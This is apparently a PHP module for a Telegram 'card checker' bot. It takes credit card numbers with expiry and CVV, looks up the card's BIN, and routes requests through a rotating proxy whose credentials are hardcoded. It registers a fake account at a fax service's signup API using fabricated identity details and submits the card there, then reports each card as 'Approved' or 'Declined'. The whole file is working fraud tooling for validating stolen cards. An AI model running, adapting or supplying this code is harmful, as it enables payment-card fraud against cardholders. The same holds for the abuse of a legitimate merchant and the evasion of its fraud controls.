<?php

$gatewayname="aut";
if (preg_match('/^[\/\.,\$](?:'.$gatewayname.')(?:\s+(.+))?$/i', $message, $matches)) {
    //==================[Inicializacion de variables]======================//
    $messages = $bot->loadPlantillas();
    $gateway = "#AuthNet_Auth (".'$aut'.")";
    $lang = $db->getUserLanguage($userId);
    
 //==================[Manejo de los Usuarios]======================//
 $accessMessage = $db->verifyUserAccess($userId, $chat_id,'$'.$gatewayname);
if ($accessMessage !== null) {
$bot->callApi('sendMessage', [
    'chat_id' => $chat_id,
    'text' => $bot->translateTemplate($accessMessage, 'en', $lang),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
    ]);
    return; 
    }
//==================[Mensaje configuracion y time]======================//
$lista = $bot->getCleanList($message, $replyMessageText);
$starttim = microtime(true);
//==================[REGEX]======================//
$validationResult = $bot->validateCreditCard($lista);
if (is_string($validationResult)) {
    $editmessage = $bot->callApi('SendMessage', [
        'chat_id' => $chat_id,
        'text' => $bot->translateTemplate($validationResult, 'en', $lang),
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true

    ])
    ]);
    sleep(3);
    $bot->callApi('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $editmessage 
    ]);
    return;
}

$cc = $validationResult['cc'];
$mes = $validationResult['mes'];
$ano = $validationResult['ano'];
$ano1 = (strlen($ano) == 2) ? $ano : substr($ano, 2);
$cvv = $validationResult['cvv'];
$creditcard = $validationResult['creditcard'];
    //==================[Antispam]======================//
    $antispam = $db->antispamCheck($userId,$username?:$firstname);

    if($antispam != False){
        $editmessage = $bot->callApi('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>$antispam,
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    
        ])
      ]);
      sleep(3);
      $bot->callApi('deleteMessage', [
          'chat_id' => $chat_id,
          'message_id' => $editmessage 
      ]);
      return;
    }
$editmessage = $bot->callApi('SendMessage', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['vSiesta_gateway'], 'en', $lang),
$gateway,
    $creditcard),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
]);
    
 //==================[Random Direcciones]======================//
    $userData = Fake::GetUser('US');

    $firstName = $userData['first_name'];
    $lastName = $userData['last_name'];
    $username1 = $userData['username'];
    $email = $userData['email'];
    $password = $userData['password'];
    $phone = $userData['phone']['format2'];
    $userAgent = $userData['userAgent'];

    $street = $userData['street'];
    $country = $userData['country'];
    $iso2 = $userData['iso2'];
    $state = $userData['state'];
    $state_id = $userData['state_id'];
    $city = $userData['city'];
    $zip = $userData['zip'];
 //==================[Bin Verificador]======================//
    $bin = substr($cc, 0, 6);
    $resultado = $bot->verificarBin($bin);

    if (!is_string($resultado)) { // Verificamos que no sea un mensaje de error
        $brand = $resultado['brand'];
        $country = $resultado['country'];
        $country_name = $resultado['country_name'];
        $country_flag = $resultado['country_flag'];
        $country_currencies = $resultado['country_currencies'];
        $bank = $resultado['bank'];
        $level = $resultado['level'];
        $type = $resultado['type'];
    } else {
        $bot->callApi('EditMessageText', [
            'chat_id' => $chat_id,
            'text' => $resultado,
            'parse_mode' => 'html',
            'message_id' => $editmessage,
         
        ]);
        exit();
    }
    
 //==================[Proxys y Cookies]======================//
$socks5 = "gw.dataimpulse.com:823";
$rotate = "b097452cc0d2c2bcc268:7580f00952ea0161";

$cookie = uniqid();


$proxies = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

 //==================[Curl Request]======================//
 $response = CurlX::Get(
    "https://api.t38fax.com/misc/regions?country=US",
    [
        'Accept: application/json, text/plain, */*',
        'Accept-Language: es-ES,es;q=0.9',
        'Connection: keep-alive',
        'Origin: https://my.t38fax.com',
        'Referer: https://my.t38fax.com/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-Requested-With: XMLHttpRequest'
    ],
    $cookie,
    $proxies
);

$response = CurlX::Post(
    "https://api.t38fax.com/signup/isloginavailable",
    '{"email":"'.$firstName.$lastName.mt_rand(100,9999).'@gmail.com"}',
    [
        'Accept: application/json, text/plain, */*',
        'Accept-Language: es-ES,es;q=0.9',
        'Connection: keep-alive',
        'Content-Type: application/json',
        'Origin: https://my.t38fax.com',
        'Referer: https://my.t38fax.com/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-Requested-With: XMLHttpRequest'
    ],
    $cookie,
    $proxies
);

$response = CurlX::Post(
    "https://api.t38fax.com/signup/hscontact",
    '{"email":"'.$firstName.$lastName.mt_rand(100,9999).'@gmail.com","firstname":"alex","lastname":"frick","company":"revenge","address":"2557 Moore Avenue","city":"Dallas","state":"NY","zip":"75201","country":"US","phone":"2144029602","form":"main"}',
    [
        'Accept: application/json, text/plain, */*',
        'Accept-Language: es-ES,es;q=0.9',
        'Connection: keep-alive',
        'Content-Type: application/json',
        'Origin: https://my.t38fax.com',
        'Referer: https://my.t38fax.com/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-Requested-With: XMLHttpRequest'
    ],
    $cookie,
    $proxies
);


$response = CurlX::Post(
    "https://api.t38fax.com/signup/precheck",
    '{"did":"B18156737306"}',
    [
        'Accept: application/json, text/plain, */*',
        'Accept-Language: es-ES,es;q=0.9',
        'Connection: keep-alive',
        'Content-Type: application/json',
        'Origin: https://my.t38fax.com',
        'Referer: https://my.t38fax.com/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-Requested-With: XMLHttpRequest'
    ],
    $cookie,
    $proxies
);

$response = CurlX::Post(
    "https://api.t38fax.com/signup/hsdid",
    '{"email":"'.$firstName.$lastName.mt_rand(100,9999).'@gmail.com","did":"B18156737306","form":"main"}',
    [
        'Accept: application/json, text/plain, */*',
        'Accept-Language: es-ES,es;q=0.9',
        'Connection: keep-alive',
        'Content-Type: application/json',
        'Origin: https://my.t38fax.com',
        'Referer: https://my.t38fax.com/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-Requested-With: XMLHttpRequest'
    ],
    $cookie,
    $proxies
);

$response = CurlX::Post(
    "https://api.t38fax.com/signup/hsstep",
    '{"email":"'.$firstName.$lastName.mt_rand(100,9999).'@gmail.com","step":3,"form":"main"}',
    [
        'Accept: application/json, text/plain, */*',
        'Accept-Language: es-ES,es;q=0.9',
        'Connection: keep-alive',
        'Content-Type: application/json',
        'Origin: https://my.t38fax.com',
        'Referer: https://my.t38fax.com/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-Requested-With: XMLHttpRequest'
    ],
    $cookie,
    $proxies
);

$response = CurlX::Post(
    "https://api.t38fax.com/signup/store",
    '{"form":"main","nocc":false,"firstname":"alex","lastname":"torrres","email":"'.$firstName.$lastName.mt_rand(100,9999).'@gmail.com","phone1":"2144029602","companyname":"revenge","baddr1":"street avenue 333","city":"new york","state":"NY","zip":"10080","country":"US","did":"B18156737306","authtype":"sipregistration","ccfirstname":"alex","cclastname":"torrres","ccaddress":"street avenue 333","cccity":"new york","cczip":"10080","cccountry":"US","ccnumber":"'.$cc.'","cvv":"'.$cvv.'","ccexpiry":"'.$mes.'/'.$ano1.'"}',
    [
        'Accept: application/json, text/plain, */*',
        'Accept-Language: es-ES,es;q=0.9',
        'Connection: keep-alive',
        'Content-Type: application/json',
        'Origin: https://my.t38fax.com',
        'Referer: https://my.t38fax.com/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-Requested-With: XMLHttpRequest'
    ],
    $cookie,
    $proxies
);
 //==================[Manejo de los mensajes]======================//
$errormessage = CurlX::ParseString($response->body,'"message":"','"');
if($errormessage=="null"){
    $errormessage = "There was a problem processing the request";
    file_put_contents(__DIR__ . "/../Responses/".str_replace(' ', '', trim($gateway)).".txt",$response->body);
} 

 //==================[Fin time]======================//
$starttime = intval(microtime(true) - $starttim);
 //==================[Manejo del bot]======================//

 if($errormessage == "Your account was created successfully"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved Auth!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
elseif($errormessage == "The card code is invalid."){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }

 else{
$bot->callApi('EditMessageText', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['gateway'], 'en', $lang),
        $gateway,
        $creditcard,
        $bot->translateText("Declined!❌", "en", $lang),
        $errormessage,
        "$type - $level",
        $bank,
        "$country_name$country_flag",
        $starttime,
        $username ?: $firstname
    ),
    'parse_mode' => 'html',
    'message_id' => $editmessage,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
        ])
    ]);
}}
